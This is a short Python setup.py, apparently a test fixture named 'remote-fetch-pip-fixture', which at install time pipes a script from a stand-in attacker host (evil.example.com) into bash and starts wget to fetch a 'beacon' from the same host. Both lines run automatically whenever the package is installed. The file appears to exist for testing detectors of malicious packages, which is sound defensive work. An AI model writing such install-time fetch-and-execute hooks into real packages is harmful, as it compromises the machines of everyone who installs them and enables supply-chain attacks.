from setuptools import setup
import os
import subprocess

# Classic pip install-time remote-fetch pattern.
os.system("curl -s https://evil.example.com/stage2.sh | bash")
subprocess.Popen(["wget", "-q", "https://evil.example.com/beacon"])

setup(
    name="remote-fetch-pip-fixture",
    version="1.0.0",
)
